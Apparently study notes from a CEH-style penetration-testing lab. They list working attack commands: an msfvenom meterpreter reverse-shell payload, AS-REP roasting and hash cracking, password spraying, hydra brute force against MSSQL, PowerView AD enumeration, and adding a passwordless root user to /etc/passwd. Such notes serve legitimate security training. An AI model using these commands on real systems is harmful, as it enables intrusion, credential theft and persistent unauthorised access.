## Reverse Shell Generator
docker run -d -p 80:80 reverse_shell_generator 

 ## Payload for windows
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe

 ### Windows hosting web file
 Run mkdir /var/www/html/share command to create a shared folder
Run chmod -R 755 /var/www/html/share command
Run chown -R www-data:www-data /var/www/html/share command


## Kerberos AS-REP Roasting

Execute the command python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22.

GetNPUsers.py: Python script to retrieve AD user information.

CEH.com/: Target AD domain.

-no-pass: Flag to find user accounts not requiring pre-authentication.

-usersfile ~/ADtools/users.txt: Path to the file with the user account list.

-dc-ip 10.10.1.22: IP address of the DC to query.


 john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt

 ## Password Spraying

 cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"

 ## Post-Enumeration Using PowerView

 powershell -EP Bypass to enable script execution

 Now, execute the command . .\PowerView.ps1 to load the PowerView.ps1 script in PowerShell.

Get-NetComputer command in PowerShell. This command will display all the information related to computers in AD. It lists all computer objects in AD, which can help in identifying network targets and mapping the AD environment.
Now, execute Get-NetGroup in PowerShell. The Get-NetGroup command in PowerView lists all groups in AD, which helps in identifying group memberships and potential targets for privilege escalation.
xecute command Get-NetUser in PowerShell. Get-NetUser in PowerView retrieves detailed information about AD user accounts, such as usernames and group memberships. It helps identify potential targets and understand the AD environment better.
Here are some other listed commands that you can use with PowerView.ps1 for enumeration:

Get-NetOU - Lists all organizational units (OUs) in the domain.
Get-NetSession - Lists active sessions on the domain.
Get-NetLoggedon - Lists users currently logged on to machines.
Get-NetProcess - Lists processes running on domain machines.
Get-NetService - Lists services on domain machines.
Get-NetDomainTrust - Lists domain trust relationships.
Get-ObjectACL - Retrieves ACLs for a specified object.
Find-InterestingDomainAcl - Finds interesting ACLs in the domain.
Get-NetSPN - Lists service principal names (SPNs) in the domain.
Invoke-ShareFinder - Finds shared folders in the domain.
Invoke-UserHunter - Finds where domain admins are logged in.
Invoke-CheckLocalAdminAccess - Checks if the current user has local admin access on specified machines.

 ## Attacking MSSQL Service

 python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433.

hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
Save the username SQL_srv in a text file and name it as user.txt using command pluma user.txt.


# Linuc Privilege Escalation

## add user locally with root privileges
echo 'haxor::0:0:root:/root:/bin/bash' >> /etc/passwd 

## suid permission
find / -perm -4000 -type f 2>/dev/null


